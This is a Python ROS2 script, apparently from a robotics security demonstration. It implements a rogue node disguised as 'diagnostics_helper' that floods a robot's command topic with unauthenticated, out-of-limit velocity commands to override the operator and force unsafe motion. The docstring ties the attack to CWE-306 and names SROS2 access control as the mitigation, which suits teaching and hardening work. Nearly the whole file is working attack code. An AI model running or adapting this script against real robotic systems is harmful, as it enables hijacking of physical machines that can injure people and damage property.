"""ATTACKER 1 — rogue node / unauthenticated command injection.

Threat: an adversary who reaches the DDS domain (same ROS_DOMAIN_ID / discovery
server) can publish to the robot's command topic with no credentials. Here we
flood /nora/cmd with an out-of-envelope velocity, overriding the operator's
gentle patrol command and driving the robot into its "unsafe" state.

Maps to CWE-306 (Missing Authentication for Critical Function) and the ROS2
DDS-Security threat model. Mitigation: SROS2 access-control (see
docs/hardening-sros2.md) would reject this publisher.

Env:
  ATTACK_LINEAR   commanded linear velocity (default 3.0 m/s, well above limit)
  ATTACK_RATE_HZ  injection rate (default 20 Hz — out-publishes the 1 Hz operator)
"""
import os

import rclpy
from geometry_msgs.msg import Twist
from rclpy.node import Node

from .common import TOPIC_CMD, command_qos


class RogueNode(Node):
    def __init__(self):
        super().__init__("diagnostics_helper")  # innocuous-looking name
        self.linear = float(os.environ.get("ATTACK_LINEAR", "3.0"))
        rate = float(os.environ.get("ATTACK_RATE_HZ", "20"))
        self.pub = self.create_publisher(Twist, TOPIC_CMD, command_qos())
        self.create_timer(1.0 / rate, self.inject)
        self.count = 0
        self.get_logger().warn(
            "ROGUE publisher active on %s (linear=%.1f m/s @ %.0f Hz), no credentials used"
            % (TOPIC_CMD, self.linear, rate)
        )

    def inject(self):
        cmd = Twist()
        cmd.linear.x = self.linear
        cmd.angular.z = 0.0
        self.pub.publish(cmd)
        self.count += 1
        if self.count % 40 == 0:
            self.get_logger().warn("injected %d malicious commands" % self.count)


def main():
    rclpy.init()
    node = RogueNode()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.try_shutdown()


if __name__ == "__main__":
    main()
